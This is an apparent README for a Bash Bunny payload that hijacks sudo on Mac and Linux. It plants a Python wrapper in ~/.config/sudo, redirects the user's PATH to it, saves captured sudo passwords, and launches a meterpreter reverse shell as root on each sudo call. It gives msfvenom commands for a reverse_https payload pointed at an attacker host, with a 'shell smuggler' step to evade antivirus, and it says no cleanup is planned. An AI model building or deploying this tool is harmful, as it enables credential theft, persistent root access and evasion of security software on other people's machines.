# Bushing's Blue Turtle: The sudo subverter

* Author: Michael Weinstein (@bionomicon)
* Version: 0.1
* Target: Mac/Linux

Mad credit to oXis for their attack approach.  Much of the code here was developed using SudoBackdoor as a reference.

Current dev status: I have tested this on a linux box and been able to pwn it repeatedly.  Everytime getting a root reverse shell.

## Description

Injector: Creates a folder called ~/.config/sudo where it puts a python wrapper for sudo and a meterpreter payload.  Next, it copies over the python sudo wrapper and meterpreter payload.  It then runs the initialization function in the wrapper script to set some environmental values like the actual path for sudo and the path for python.  The initialization function also initializes a file for saving sudo creds and slightly alters the meterpreter payload so it will fail silently if there is a bad network connection or other exception.  Finally, it will set a new value in the user's PATH so that they will be running this wrapper instead of actually doing sudo.  The main abnormality a user should see is a slight delay in being asked to enter their password.  After this wrapper runs the desired sudo command, it will use the captured password (although probably not absolutely necessary at this stage) to have sudo run the meterpreter payload.  That should open up a meterpreter session on the listening computer with root on the target. True pwnage. Every time they sudo something.
Cleaner: I will probably make a cleaner for this thing eventually for completeness sake... but really, why make a cleaner when this thing should give you multiple remote root shells?   

## Configuration

Inside the injector and the cleaner you can specify mac=true to switch the playload to macos mode.  This payload has been tested on mac and linux.  Works on both mac and linux.  Mac was running sophos antivirus during the test and it blocked download of the reverse tcp shell.  This can be fixed with the use of my shell smuggler (see below for details).

##Crafting a meterpreter shell payload

Payloads should be crafted in msfvenom.  The meterpreter shell will be the python reverse https meterpreter payload.  The payload should be stored in the folder with the rest of the files for this bash bunny payload in a file called shell.py (stored on the target system as .sudo in the directory we created).  The command for generating an appropriate meterpreter shell payload is below:
```msfvenom -p python/meterpreter/reverse_https LHOST=<IP ADDRESS> LPORT=<PORT> -f raw > payload.py```

Note that *antivirus appears to pick up this reverse tcp payload* really well. Annoying. shellSmuggler.py to the rescue!  The best way to run this is to cd into the bashbunny itself and then into the payloads switch folder you are running from and run the following command (plugging in your IP address and port):
```msfvenom -p python/meterpreter/reverse_https LHOST=<IP ADDRESS> LPORT=<PORT> -f raw | python ShellSmuggler.py > shell.py```

## STATUS  (Note that I used the same configuration as SudoBackdoor, but I am seeing different LED behaviors.  Will investigate this soon.)
Injector 

| LED              | Status               |
| ---------------- | -------------------- |
| White            |  Ready               |
| Amber blinking   |  Waiting for server  |
| Blue blinking    |  Attacking           |
| Green            |  Finished            |
    
Cleaner (when it is made)

| LED              | Status               |
| ---------------- | -------------------- |
| White            |  Ready               |
| Blue blinking    |  Attacking           |
| Green            |  Finished            |
